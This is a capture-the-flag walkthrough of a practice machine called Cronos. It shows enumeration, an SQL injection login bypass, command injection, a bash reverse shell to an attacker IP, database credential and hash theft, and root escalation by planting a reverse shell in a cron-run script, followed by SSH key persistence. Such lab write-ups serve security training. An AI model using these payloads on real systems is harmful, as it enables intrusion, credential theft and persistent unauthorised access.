# Loot

## Box Info
- Name : Cronos
- IP : 10.10.10.13
- Level : Medium
-  OS : Linux

## Creds

| Service | Username | Password | Description |
| --- | --- | --- | ---| 
|Database|admin|kEjdbRigfBHUREiNSDs|Credentials for database - admin|
|Webpage|admin|4f5fffa7b2340178a716e3832451e058|Hash found in users table|
|Webpage|admin|1327663704|Hash cracked|
# Enumeration

## Nmap

#### Stage 1 : Quick Scan
- Running a fast scan to just enumerate the open ports, we will not know about the services (can't be sure), but we can know which ports to run against.
```bash
sudo nmap -p- --max-retries 0 10.10.10.13 -oN nmap/quick_scan                                                 1 ↵

...[snip]...

PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 169.22 seconds

```

- We can see that it is running a DNS service and a web server on port 80.

#### Stage 2 : 
- Grep out all the valid ports to scan from : 
```bash 
cat nmap/quick_scan | grep open | awk -F/ '{print $1}' | tr '\n' ','
22,53,80,%
```

- Running targeted scan against the ports:
```bash
sudo nmap -sC -sV -p 22,53,80 -oN nmap/targeted_scan 10.10.10.13 -A                                                     130 ↵
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-29 05:29 EDT
Nmap scan report for 10.10.10.13
Host is up (0.18s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   184.59 ms 10.10.14.1
2   184.71 ms 10.10.10.13

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.01 seconds

```

- DNS Name server DIentifier service is running on port 53 and it is TCP not UDP.
- For now visiting port 80 for further attack vectors

## Dig
- We know that DNS NSID is running.
- Add cronos.htb to /etc/hosts
- Then use axfr to enumerate the VHOSTS. axfr helps us enumerating as it queries for the VHSOST recursively
```bash 
dig axfr cronos.htb @10.10.10.13

; <<>> DiG 9.16.12-Debian <<>> axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 180 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Mon Mar 29 05:39:58 EDT 2021
;; XFR size: 7 records (messages 1, bytes 203)

```


## Gobuster
- Running gobuster against cronos.htb
```bash
gobuster dir -u http://cronos.htb -w $MED_WORD -t 50 -o gb/init_scan -x txt                                   1 ↵ 

...[snip]...

===============================================================              
2021/03/29 05:40:48 Starting gobuster in directory enumeration mode          
===============================================================                                                                           
/css                  (Status: 301) [Size: 306] [--> http://cronos.htb/css/] 
/js                   (Status: 301) [Size: 305] [--> http://cronos.htb/js/]                                                               
/robots.txt           (Status: 200) [Size: 24]                                                                                            
/server-status        (Status: 403) [Size: 298]                                                                                           
Progress: 234368 / 441122 (53.13%)                                         ^C                                                             
```
- No luck
- Running against http://admin.cronos.htb
```bash
gobuster dir -u http://admin.cronos.htb -w $MED_WORD -t 50 -o gb/admin -x php                              [5/297]
...[snip]...
===============================================================
2021/03/29 06:01:56 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1547]
/welcome.php          (Status: 302) [Size: 439] [--> index.php]
/logout.php           (Status: 302) [Size: 0] [--> index.php]  
/config.php           (Status: 200) [Size: 0]                   
/session.php          (Status: 302) [Size: 0] [--> index.php]  
Progress: 89084 / 441122 (20.19%)                             ^C

```
# HTTP Web Server 

- Apache/2.4.18 .
- From this apache version, we can guess that it runs Ubuntu 16.04.
- Visiting the web page gives us default Apache Page 
- ![[Pasted image 20210329053737.png]]

- Adding cronos.htb and admin.cronos.htb to /etc/hosts

## VHOSTS

###  First Vhost - http://cronos.htb

- Visit the webpage
- ![[Pasted image 20210329054600.png]]
- All the links lead to Laravel Docs - So must be PHP based.
- robots.txt is present, but it doesn't disallow anything, so no help there.
- View source doesn't help too

### Second Vhost - http://admin.cronos.htb
- A login page.
![[Pasted image 20210329054958.png]]
- Send a login request to burp.
- Burp Request:
![[Pasted image 20210329055140.png]]
- PHP SESSID is present.
- Trying SQLi : `' or 1=1#` as username and password. We get access to welcome.php
![[Pasted image 20210329055718.png]]
- Capturing the request.
![[Pasted image 20210329055833.png]]
- We can check that the standard request takes around 198 milliseconds.
![[Pasted image 20210329060025.png]]
- We can check code execution by adding command sleep and host (actually arg to sleep) as 5. It takes 5 seconds . Thus code execution is possible. Command can directly run the code.
![[Pasted image 20210329060217.png]]

# Foothold
## Reverse Shell

### The POST request
```
POST /welcome.php HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://admin.cronos.htb
Connection: close
Referer: http://admin.cronos.htb/welcome.php
Cookie: PHPSESSID=bfaodntocohp2c7vqn8731k3s4
Upgrade-Insecure-Requests: 1
command=sleep+5&host=
```

- Reverse Shell payload
```bash 
bash -c 'bash -i  >& /dev/tcp/10.10.14.5/9001 0>&1' 
``` 
![[Pasted image 20210329061212.png]]

## Current User
- Currently as www-data. Cat out config.php
 ```php
 <?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>

```
- Query admin.users table
```mysql
mysql> show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.01 sec)

mysql> select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)

```
- MD5 hash. Crack using hashcat : **admin**:**1327663704**, but doesn't work other user.
- User named noulis# Priv Esc from www-data to root (directly)

- We can cat out the user.txt without being noulis from /home/noulis
- Intersting things:
	-  \* \* \* \* \*       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
	-  Some open and listening ports
	```bash
	tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      - Mysql                
	tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      - RDNS
	```
	- Interesting files:
	```bash
	/home/noulis/.composer/cache/files/mockery/mockery/f30d894582b8b548b641819cd37c4cfc11d5b315.zip 
	/home/noulis/.composer/cache/files/tijsverkoyen/css-to-inline-styles/b52e5b78653e57b3b07937c1f84109ac7f77e5e0.zip
	/home/noulis/.composer/cache/files/sebastian/code-unit-reverse-lookup/9fdb38e356a0265a2dd6b64495413906b9366038.zip
	/home/noulis/.composer/cache/files/sebastian/resource-operations/fd2c0f591ee5fee7aa3eb70f20a1d64c1dc26e8d.zip
	/home/noulis/.composer/cache/files/sebastian/diff/d845e8b0ee3d707d4b13b9febac4e7a0e8b22fe5.zip
	/home/noulis/.composer/cache/files/sebastian/global-state/a0ef5bf736af85b66572f9ed232aa35c18fe5fb7.zip
	/home/noulis/.composer/cache/files/sebastian/exporter/81e14d73852681aabe5c5a9d8be1ef2045a9170a.zip
	/home/noulis/.composer/cache/files/sebastian/comparator/bdc0b01e0827c360d54386fe60dfc6bd65168f80.zip
	/home/noulis/.composer/cache/files/sebastian/version/c315a200d32565a6d8ebb3495cb5ae34c5ced3c8.zip
	/home/noulis/.composer/cache/files/sebastian/environment/72b70c30c0946406c4562db7b7c647d084a87e12.zip
	/home/noulis/.composer/cache/files/sebastian/recursion-context/82276e6cc560a972510bb0c2dc0aa78fa4701777.zip
	```
	- Laravel files
	 ```bash
	 /var/www/laravel/.env
	 ```
- Coming back to the first file /var/www/laravel/artisan, we see that it is run every minute. Also it in the folder which can be edited by www-data
- So we can edit artisan bu adding  `exec("bash -c 'bash -i >& /dev/tcp/10.10.14.5/9002 0>&1'");` into the script after \<?php...?> tag first encountered .
- Also open a listener on port 9002.
	```bash
	nc -lnvp 9002
	listening on [any] 9002 ...
	
	connect to [10.10.14.5] from (UNKNOWN) [10.10.10.13] 34696
	/bin/sh: 0: can't access tty; job control turned off
	# id
	uid=0(root) gid=0(root) groups=0(root)
	# 
	```
- Cat out the root.txt. Create a .ssh folder. Crete our own ssh-keygen on our local machine. Append pub key to the ssh folder in the other machine. Login as root when wanted.